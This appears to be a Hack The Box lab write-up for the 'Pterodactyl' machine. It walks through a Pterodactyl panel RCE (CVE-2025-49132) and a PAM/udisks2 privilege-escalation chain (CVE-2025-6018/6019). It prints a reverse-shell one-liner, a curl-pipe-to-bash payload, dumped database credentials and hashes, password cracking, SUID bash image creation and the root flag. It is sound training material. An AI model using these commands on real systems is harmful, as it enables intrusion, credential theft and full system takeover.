---
title: Pterodactyl
type: writeup
category: linux
platform: HTB
difficulty: hard
os: Linux
date: 2026-04-19
tags:
  - CVE-2025-49132
  - CVE-2025-6018
  - CVE-2025-6019
  - Pterodactyl
summary: Full lab walkthrough from recon to root with exploit chain and practical troubleshooting notes.
initialAccess: RCE on Pterodactyl panel path and service pivots.
privesc: Chained local misconfig/exploit path to execute SUID bash and get root.
---

# Pterodactyl

ok first as we do every time start with the nmap scan 

```bash
❯ sudo nmap -Pn 10.129.26.208 -sCV -o scan.txt
[sudo] password for samurai: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 09:52 +0200
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.54% done; ETC: 09:52 (0:00:00 remaining)
Nmap scan report for 10.129.26.208
Host is up (0.24s latency).
Not shown: 971 filtered tcp ports (no-response), 25 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds
```

so not that much ,but lets see what is on the web 

![image.png](image.png)

so we have new sub , when i went for it it just redirects me to pterodactyl.htb

then when i clicked that button CHANGELOGS :

![image.png](image%201.png)

as u can see there is a panel for this site and with version v1.11.10 

so went to my etc/hosts to add it too and open it 

![image.png](image%202.png)

and also searched for exploit for this version and found https://www.exploit-db.com/exploits/52341

so lets use this exploit 

![image.png](image%203.png)

```bash
❯ python3 52341.py http://panel.pterodactyl.htb/
http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
```

so we have credentials for the database USERNAME : pterodactyl , PASSWORD : PteraPanel

and found exploit on git hub which allows u to do rce [https://github.com/rippsec/CVE-2025-49132-PHP-PEAR](https://github.com/rippsec/CVE-2025-49132-PHP-PEAR)

![image.png](image%204.png)

this confirm the vuln so lets start abusing it 

![image.png](image%205.png)

so lets get our shell ready 

```bash
❯ nano shell.sh

❯ echo 'bash -i >& /dev/tcp/10.10.17.212/4444 0>&1' > shell.sh
❯ cat shell.sh
bash -i >& /dev/tcp/10.10.17.212/4444 0>&1
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.26.208 - - [05/Apr/2026 12:30:57] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
#then waitfor the shell 
nc -lnvp 4444 
```

```bash
❯ python3 poc.py -H panel.pterodactyl.htb -c "curl http://10.10.17.212:8080/shell.sh | bash"
[CVE-2025-49132] Pterodactyl Panel RCE via PHP PEAR
/ [!] Unexpected error: timed out
```

![image.png](image%206.png)

![image.png](image%207.png)

ok ok lets start cooking , as we remember there was mairaDB on the server and we had credentials to enter it so.. 

![image.png](image%208.png)

```bash
wwwrun@pterodactyl:/var/www/pterodactyl/public> /usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel
<db -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 663
Server version: 11.8.3-MariaDB MariaDB package

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [panel]> show tables;
show tables;
+-----------------------+
| Tables_in_panel       |
+-----------------------+
| activity_log_subjects |
| activity_logs         |
| allocations           |
| api_keys              |
| api_logs              |
| audit_logs            |
| backups               |
| database_hosts        |
| databases             |
| egg_mount             |
| egg_variables         |
| eggs                  |
| failed_jobs           |
| jobs                  |
| locations             |
| migrations            |
| mount_node            |
| mount_server          |
| mounts                |
| nests                 |
| nodes                 |
| notifications         |
| password_resets       |
| recovery_tokens       |
| schedules             |
| server_transfers      |
| server_variables      |
| servers               |
| sessions              |
| settings              |
| subusers              |
| tasks                 |
| tasks_log             |
| user_ssh_keys         |
| users                 |
+-----------------------+
35 rows in set (0.001 sec)

MariaDB [panel]> select * from users;
select * from users;
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_token                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |
|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |
+----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+--------------------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+
2 rows in set (0.001 sec)

MariaDB [panel]> 
```

as u can see the user “headmonitor” is root

lets try to crack the password 

![image.png](image%209.png)

```bash
❯ john hashed.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:10 0.04% (ETA: 2026-04-07 18:26) 0g/s 93.24p/s 187.5c/s 187.5C/s brenden..alejo
0g 0:00:01:14 0.04% (ETA: 2026-04-07 18:28) 0g/s 93.24p/s 187.4c/s 187.4C/s bethan..quinton
0g 0:00:01:22 0.04% (ETA: 2026-04-07 18:37) 0g/s 92.95p/s 186.7c/s 186.7C/s tilly..green2
!QAZ2wsx         (?)     
1g 0:00:03:51 0.16% (ETA: 2026-04-07 06:47) 0.004328g/s 120.6p/s 180.7c/s 180.7C/s frank123..barbie3
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
❯ ssh phileasfogg3@pterodactyl.htb
The authenticity of host 'pterodactyl.htb (10.129.26.208)' can't be established.
ED25519 key fingerprint is: SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'pterodactyl.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
Have a lot of fun...
Last login: Sun Apr 5 16:07:15 2026 from 10.10.17.212
phileasfogg3@pterodactyl:~> ls
bin  user.txt
phileasfogg3@pterodactyl:~> whoami
phileasfogg
```

after we took access we had to make some enum about the os 

```jsx
cat /etc/os-release
NAME="openSUSE Leap"
VERSION="15.6"
ID="opensuse-leap"
ID_LIKE="suse opensuse"
VERSION_ID="15.6"
PRETTY_NAME="openSUSE Leap 15.6"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:opensuse:leap:15.6"
BUG_REPORT_URL="https://bugs.opensuse.org"
HOME_URL="https://www.opensuse.org/"
DOCUMENTATION_URL="https://en.opensuse.org/Portal:Leap"
LOGO="distributor-logo-Leap"
phileasfogg3@pterodactyl:~> 
```

---

then after search about vuln in the os we found [https://github.com/MaxKappa/opensuse-leap-privesc-exploit](https://github.com/MaxKappa/opensuse-leap-privesc-exploit)

```jsx
phileasfogg3@pterodactyl:~> cd /var
phileasfogg3@pterodactyl:/var> ls -al
total 20
drwxr-xr-x 1 root root 116 Jan  2 09:35 .
drwxr-xr-x 1 root root 236 Jan  2 09:34 ..
-rw-r--r-- 1 root root 208 Jan  2 09:34 .updated
drwxr-xr-x 1 root root 128 Sep 12  2025 adm
lrwxrwxrwx 1 root root  11 Dec  5  2024 agentx -> /run/agentx
drwxr-xr-x 1 root root 110 Sep 21  2025 cache
drwxr-xr-x 1 root root   0 Mar 15  2022 crash
drwxr-xr-x 1 root root 540 Jan  1 09:40 lib
lrwxrwxrwx 1 root root   9 Sep 12  2025 lock -> /run/lock
drwxr-xr-x 1 root root 558 Apr 18 19:35 log
lrwxrwxrwx 1 root root  10 May 27  2024 mail -> spool/mail
drwxr-xr-x 1 root root   0 Mar 15  2022 opt
lrwxrwxrwx 1 root root   4 Sep 12  2025 run -> /run
drwxr-xr-x 1 root root 108 Sep 12  2025 spool
drwxrwxrwt 1 root root 728 Apr 18 19:35 tmp
drwxr-xr-x 1 root root  30 Nov  7 16:59 www
phileasfogg3@pterodactyl:/var> cd mail
phileasfogg3@pterodactyl:/var/mail> ls -al
total 4
drwxrwxrwt 1 root         root  46 Nov  7 18:41 .
drwxr-xr-x 1 root         root 108 Sep 12  2025 ..
-rw-rw---- 1 headmonitor  mail   0 Nov  7 15:54 headmonitor
-rw-rw---- 1 phileasfogg3 mail 960 Dec 29 15:58 phileasfogg3
phileasfogg3@pterodactyl:/var/mail> cd ph
-bash: cd: ph: No such file or directory
phileasfogg3@pterodactyl:/var/mail> cat phileasfogg3 
From headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
Delivered-To: phileasfogg3@pterodactyl
Received: by pterodactyl (Postfix, from userid 0)
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
From: headmonitor headmonitor@pterodactyl
To: All Users all@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Message-ID: 202511070915.headmonitor@pterodactyl
Date: Fri, 07 Nov 2025 09:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator

```

as u can see the admin is talking about somthing in the udisks 

so we should search for something about this https://success.qualys.com/discussions/s/article/000008043 

it combines two vulns together **CVE-2025-6018 + CVE-2025-6019 Exploit Chain as it says in the blog** 

``` bash
  - Allow User
    

    خلينا نوضح بشكل مختصر: polkit هو النظام المسؤول عن التحكم في صلاحيات العمليات المرتبطة بالـ disks والmounts على لينكس. لما المستخدم ينفذ عملية معينة، polkit يصنف الجلسة حسب 3 أنواع:

    | المستوى            | الشرح | مثال                  |
    |--------------------|-------|-----------------------|
    | **allow_active**   | المستخدم جالس فعلياً على الجهاز (console أو GUI) | أعلى صلاحية    |
    | **allow_inactive** | مستخدم محلي لكن مش active    | صلاحية وسط      |
    | **allow_any**      | أي جلسة—even ريموت (SSH, VNC)    | أقل صلاحية عادة |

```
    
```jsx
    CVE-2025-6019 – libblockdev / udisks LPE
    
    Affected Systems: Most Linux distributions with udisks daemon
    
    Description:
    
    Exploitable by “allow_active” users.
    
    Allows mounting malicious images with improper security flags (nosuid, nodev) to gain full root privileges.
    
    Impact: Local attacker can achieve full root access.
  ```
    
as u can see we can chain them to get our root shell ;) 
    
now lets get our exploit to put it on the victim system 
    
```bash
    git clone https://github.com/DesertDemons/CVE-2025-6018-6019.githi
    ```
    
    and started python server to uploud the exploit on the host “victim”
    
    and in the host 
    
    ```bash
    curl http://my_ip:port/exploit.sh -o exploit.sh 
    ```
    
    and lets start setting up the exploit and check for the vulns 
    
    ```bash
    phileasfogg3@pterodactyl:~> ./exploit.sh --check
    
    ╔═══════════════════════════════════════════════════════════════╗
    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║
    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║
    ║                                                               ║
    ║  Author: DesertDemons                                         ║
    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    [*] Running full vulnerability check...
    
    [*] Checking dependencies...
    [+] All dependencies found
    
    [*] Checking PAM configuration (CVE-2025-6018)...
    [+] pam_env.so found in PAM configuration
    [+] pam_systemd.so found - escalation vector available
    [*] Detected OS: openSUSE Leap 15.6
    [+] Target OS is vulnerable (openSUSE/SLES)
    
    [*] Checking udisks2 configuration (CVE-2025-6019)...
    [*] udisks2 version: unknown
    [+] XFS filesystem support available
    [+] Polkit allows loop-setup for active users
    
    [*] Checking allow_active status...
    [!] allow_active status: NO (got: ('challenge',))
        You need to setup PAM bypass first (--setup)
    phileasfogg3@pterodactyl:~> ./exploit.sh --setup
    
    ╔═══════════════════════════════════════════════════════════════╗
    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║
    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║
    ║                                                               ║
    ║  Author: DesertDemons                                         ║
    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    [*] Setting up PAM bypass (CVE-2025-6018)...
    [+] Created /home/phileasfogg3/.pam_environment
        Contents:
        XDG_SEAT=seat0
        XDG_VTNR=1
    
    [!] IMPORTANT: You must now:
        1. Exit this SSH session completely
        2. SSH back into the target
        3. Run: su - phileasfogg3
        4. Enter your password
        5. Then run this script with --exploit <image_path>
    
    [*] After reconnecting, verify with: ./exploit.sh --check
    phileasfogg3@pterodactyl:~> ./exploit.sh --check
    
    ╔═══════════════════════════════════════════════════════════════╗
    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║
    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║
    ║                                                               ║
    ║  Author: DesertDemons                                         ║
    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    [*] Running full vulnerability check...
    
    [*] Checking dependencies...
    [+] All dependencies found
    
    [*] Checking PAM configuration (CVE-2025-6018)...
    [+] pam_env.so found in PAM configuration
    [+] pam_systemd.so found - escalation vector available
    [*] Detected OS: openSUSE Leap 15.6
    [+] Target OS is vulnerable (openSUSE/SLES)
    
    [*] Checking udisks2 configuration (CVE-2025-6019)...
    [*] udisks2 version: unknown
    [+] XFS filesystem support available
    [+] Polkit allows loop-setup for active users
    
    [*] Checking allow_active status...
    [!] allow_active status: NO (got: ('challenge',))
        You need to setup PAM bypass first (--setup)
    phileasfogg3@pterodactyl:~> ls -al
    total 44
    drwxr-xr-x 1 phileasfogg3 users   208 Apr 18 20:13 .
    drwxr-xr-x 1 root         root     46 Nov  7 18:41 ..
    lrwxrwxrwx 1 root         root      9 Dec 31 17:29 .bash_history -> /dev/null
    -rw-r--r-- 1 phileasfogg3 users  1177 Aug 22  2024 .bashrc
    drwx------ 1 phileasfogg3 users     0 Mar 15  2022 .cache
    drwx------ 1 phileasfogg3 users     0 Mar 15  2022 .config
    -rw-r--r-- 1 phileasfogg3 users  1637 Apr  9  2018 .emacs
    drwxr-xr-x 1 phileasfogg3 users     0 Mar 15  2022 .fonts
    -rw-r--r-- 1 phileasfogg3 users   861 Apr  9  2018 .inputrc
    drwx------ 1 phileasfogg3 users     0 Mar 15  2022 .local
    -rw-r--r-- 1 phileasfogg3 users    26 Apr 18 20:13 .pam_environment
    -rw-r--r-- 1 phileasfogg3 users  1028 Aug 22  2024 .profile
    drwxr-xr-x 1 phileasfogg3 users     0 Mar 15  2022 bin
    -rwxr-xr-x 1 phileasfogg3 users 15903 Apr 18 20:13 exploit.sh
    -rw-r--r-- 1 root         root     33 Apr 18 19:35 user.txt
    phileasfogg3@pterodactyl:~> exit 
    logout
    Connection to pterodactyl.htb closed.
    ❯ ssh phileasfogg3@pterodactyl.htb
    ** WARNING: connection is not using a post-quantum key exchange algorithm.
    ** This session may be vulnerable to "store now, decrypt later" attacks.
    ** The server may need to be upgraded. See https://openssh.com/pq.html
    (phileasfogg3@pterodactyl.htb) Password: 
    Have a lot of fun...
    Last login: Sat Apr 18 19:39:43 2026 from 10.10.17.212
    Last login: Sat Apr 18 20:24:30 2026 from 10.10.17.212
    phileasfogg3@pterodactyl:~> su - phileasfogg3
    Password: 
    phileasfogg3@pterodactyl:~> ./exploit.sh --check
    
    ╔═══════════════════════════════════════════════════════════════╗
    ║         CVE-2025-6018 + CVE-2025-6019 Exploit                 ║
    ║      PAM Bypass + udisks2 XFS Race Condition LPE             ║
    ║                                                               ║
    ║  Author: DesertDemons                                         ║
    ║  GitHub: github.com/DesertDemons/CVE-2025-6018-6019          ║
    ╚═══════════════════════════════════════════════════════════════╝
    
    [*] Running full vulnerability check...
    
    [*] Checking dependencies...
    [+] All dependencies found
    
    [*] Checking PAM configuration (CVE-2025-6018)...
    [+] pam_env.so found in PAM configuration
    [+] pam_systemd.so found - escalation vector available
    [*] Detected OS: openSUSE Leap 15.6
    [+] Target OS is vulnerable (openSUSE/SLES)
    
    [*] Checking udisks2 configuration (CVE-2025-6019)...
    [*] udisks2 version: unknown
    [+] XFS filesystem support available
    [+] Polkit allows loop-setup for active users
    
    [*] Checking allow_active status...
    [+] allow_active status: YES
        You have allow_active privileges!
    
    [*] Checking session details...
    [*] Session ID: 52
        Seat: seat0
        Active: yes
        Type: tty
    [+] Session is properly configured for exploitation
    
    [*] Vulnerability check complete
    phileasfogg3@pterodactyl:~> 
    
    ```
    
    as u can see the target is vulnerable for both vulns 
    
    lets make our image to start exploiting 
    
    > now its the next day after alot of trying the exploit was not working bcs of the flags was not compatible with the opensuse , so i had to go with ai to search for solution for this and did this
    > 
    
    ```bash
    mkdir /mnt/xfs
    ```
    
    ```bash
    ❯ dd if=/dev/zero of=xfs.image bs=1M count=300
    
    300+0 records in
    300+0 records out
    314572800 bytes (315 MB, 300 MiB) copied, 0.0525506 s, 6.0 GB/s
    ```
    
    ```bash
    ❯ mkfs.xfs \
      -m bigtime=0,inobtcount=0 \
      -i nrext64=0,exchange=0 \
      xfs.image
    ```
    
    ```bash
    ❯ sudo mount -o loop xfs.image /mnt/xfs
    ```
    
    ```bash
    ❯ scp phileasfogg3@pterodactyl.htb:/bin/bash /tmp/bash_target
    ** WARNING: connection is not using a post-quantum key exchange algorithm.
    ** This session may be vulnerable to "store now, decrypt later" attacks.
    ** The server may need to be upgraded. See https://openssh.com/pq.html
    (phileasfogg3@pterodactyl.htb) Password: 
    bash                             100%  989KB  70.6KB/s   00:14    
    ```
    
    ```bash
    ❯ sudo cp /tmp/bash_target /mnt/xfs/bash
    ❯ sudo chmod 4755 /mnt/xfs/bash
    
    ❯ sudo umount /mnt/xfs
    
    ❯ ls -la /mnt/xfs/
    total 8
    drwxr-xr-x 2 root root 4096 Apr 19 10:45 .
    drwxr-xr-x 3 root root 4096 Apr 19 10:45 ..
    ❯ sudo mount -o loop xfs.image /mnt/xfs
    ❯ ls -la /mnt/xfs/
    
    total 996
    drwxr-xr-x 2 root root      18 Apr 19 10:54 .
    drwxr-xr-x 3 root root    4096 Apr 19 10:45 ..
    -rwsr-xr-x 1 root root 1012656 Apr 19 10:54 bash
    ❯ sudo umount /mnt/xfs
    
    ```
    
    starting http server to transfer the image and the exploit 
    
    ```bash
    python3 -m http.server 8080
    ```
    
    > didnt work too
    > 

so after alot of tries with the 2025-6019 , i found this repo that make the image with the needed flags https://github.com/0rionCollector/Exploit-Chain-CVE-2025-6018-6019/tree/main

```bash
cp /tmp/bash_target "$MOUNT_DIR/bash"
chown root:root "$MOUNT_DIR/bash"
chmod 4755 "$MOUNT_DIR/bash"

=================================
sed -i 's/mkfs.xfs -f "$IMAGE_PATH"/mkfs.xfs -f -i exchange=0 -n parent=0 "$IMAGE_PATH"/g' ExploitChain.sh
#this line was the whole problem that the machine was on v4 which use flags "-i exchange=0 -n parent=0" but the tool was making it for v5 which is (1,1)
```

this code shows some changes in the [exploit.sh](http://exploit.sh) “i have changed the /bin/bash to the bash that i got from the target “

```bash
scp phileasfogg3@pterodactyl.htb:/bin/bash /tmp/bash_target
```

so after using stage1 in the exploit which creating the image 

```bash
sudo bash ExploitChain.sh stage1

╔═══════════════════════════════════════════════════════════╗
║       CVE-2025-6018 + CVE-2025-6019 Chain Exploit        ║
║           PAM Injection → UDisks2 LPE (Root)             ║
╚═══════════════════════════════════════════════════════════╝

Three-Stage Attack:
  STAGE 1: Create XFS image (Kali/Attacker machine)
  STAGE 2: PAM environment injection (Target)
  STAGE 3: UDisks2 privilege escalation (Target → Root)

[*] ═══════════════════════════════════════════════════
[*] STAGE 1: Create XFS Image with SUID bash
[*] ═══════════════════════════════════════════════════

[i] Image path: ./xfs.image
[i] Checking dependencies...
[+] dd: found
[+] mkfs.xfs: found
[+] mount: found
[+] umount: found

[*] Creating 300 MB disk image...
300+0 records in
300+0 records out
314572800 bytes (315 MB, 300 MiB) copied, 0.0582978 s, 5.4 GB/s
[+] Image file created: 300M

[*] Formatting as XFS filesystem...
[+] XFS filesystem created

[*] Mounting image at: /tmp/tmp.U2MdqXHkZz
[+] Image mounted successfully

[*] Copying /bin/bash and setting SUID bit...

[i] Verifying SUID bash in image:
-rwsr-xr-x 1 root root 989K Apr 19 15:43 /tmp/tmp.U2MdqXHkZz/bash
[+] SUID bash configured successfully

[*] Syncing and unmounting...

╔═══════════════════════════════════════════════════════════╗
║              STAGE 1 COMPLETE - IMAGE READY               ║
╚═══════════════════════════════════════════════════════════╝

Image created: /home/samurai/labs/hackthebox/Pterodactyl/exploit/Exploit-Chain-CVE-2025-6018-6019/xfs.image
Image size: 300M
Filesystem:  SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)

Next steps:
1. Transfer image to target:
   scp xfs.image user@target:/tmp/

2. On target, run STAGE 2:
   ExploitChain.sh stage2

```

i have transfer the image and the exploit to the target using scp also 

```bash
❯ scp xfs.image.gz phileasfogg3@pterodactyl.htb:/tmp/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
xfs.image.gz                                                                                          100%  852KB 151.2KB/s   00:05    
❯ scp ExploitChain.sh phileasfogg3@pterodactyl.htb:/home/phileasfogg3/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
(phileasfogg3@pterodactyl.htb) Password: 
ExploitChain.sh                
```

i have started the stage 2 which creating the pam_environment file that abuse 2025-6018 as i have been taking about the allow user 

```bash
phileasfogg3@pterodactyl:~> bash ExploitChain.sh auto /tmp/xfs.image 

╔═══════════════════════════════════════════════════════════╗
║       CVE-2025-6018 + CVE-2025-6019 Chain Exploit        ║
║           PAM Injection → UDisks2 LPE (Root)             ║
╚═══════════════════════════════════════════════════════════╝

Three-Stage Attack:
  STAGE 1: Create XFS image (Kali/Attacker machine)
  STAGE 2: PAM environment injection (Target)
  STAGE 3: UDisks2 privilege escalation (Target → Root)

[i] Automatic exploitation mode
[i] Detecting current environment...

[+] allow_active already obtained - skipping STAGE 2
[*] Proceeding to STAGE 3

[*] ═══════════════════════════════════════════════════
[*] STAGE 3: CVE-2025-6019 (UDisks2 LPE)
[*] ═══════════════════════════════════════════════════

[i] Verifying allow_active status...
[+] allow_active status: CONFIRMED

[i] Current session properties:
    Remote=yes
    RemoteHost=10.10.17.212
    Type=tty
    Class=user
    Active=yes
    State=active

[i] Checking dependencies...
[+] dd: found
[+] udisksctl: found
[+] gdbus: found
[+] killall: found
[+] file: found

[+] XFS image found: /tmp/xfs.image
[i] Verifying image...
    /tmp/xfs.image: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)

[*] Stopping gvfs-udisks2-volume-monitor...
[i] gvfs monitor not running (OK)

[*] Setting up loop device via UDisks2...
[i] Calling: udisksctl loop-setup --file /tmp/xfs.image
[+] Loop device created: /dev/loop5

[*] Starting filesystem busy-keeper...
[i] This prevents automatic unmount after resize failure
[+] Background watcher started (PID: 4001)

[*] ═══════════════════════════════════════════════════
[*] Triggering CVE-2025-6019 via Filesystem.Resize
[*] ═══════════════════════════════════════════════════

D-Bus call details:
  Destination: org.freedesktop.UDisks2
  Object:      /org/freedesktop/UDisks2/block_devices/loop5
  Method:      org.freedesktop.UDisks2.Filesystem.Resize
  Parameters:  0 (size), {} (options)

[*] Calling resize (will fail - this is expected)...

    Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop5: Failed to unmount '/dev/loop5' after resizing it: target is busy

[*] Waiting for automatic mount to appear...
[i] libblockdev will mount filesystem before resize attempt

[*] Searching for SUID bash in /tmp/blockdev*...
[i] Search attempt 1/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 2/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 3/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 4/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 5/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 6/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 7/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 8/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 9/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:
[i] Search attempt 10/10...
[+] Mount point found: /tmp/blockdev.4PU3N3
[i] Contents:

[-] SUID bash not found after 10 attempts
[-] Exploitation failed!
phileasfogg3@pterodactyl:~> ls -l /tmp/blockdev*
ls: cannot open directory '/tmp/blockdev.4PU3N3': Permission denied
/tmp/blockdev.4RPGO3:
total 992
-rwsr-xr-x 1 root root 1012656 Apr 19 16:52 bash
ls: cannot open directory '/tmp/blockdev.D6TEO3': Permission denied
ls: cannot open directory '/tmp/blockdev.GUEUN3': Permission denied
ls: cannot open directory '/tmp/blockdev.I90BO3': Permission denied
ls: cannot open directory '/tmp/blockdev.Z5ZVN3': Permission denied
phileasfogg3@pterodactyl:~> ls -l /tmp/blockdev.4RPGO3/bash
-rwsr-xr-x 1 root root 1012656 Apr 19 16:52 /tmp/blockdev.4RPGO3/bash
phileasfogg3@pterodactyl:~> /tmp/blockdev.4RPGO3/bash -p
bash-4.4# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
bash-4.4# pwd
/home/phileasfogg3
bash-4.4# cd /root
bash-4.4# cat root.txt
657f11ccca61e9b02a8dc7116f2b2116

```

as u can see the bash file was there mounted but the exploit couldnt realize it so all i needed to do just to run it and baaam root shell spawn

> what i have learned from this lab is to not give up , it was more mental than technical to me so always dont lose hope in a thing that u love
> 

![image.png](image%2010.png)

![image.png](image%2011.png)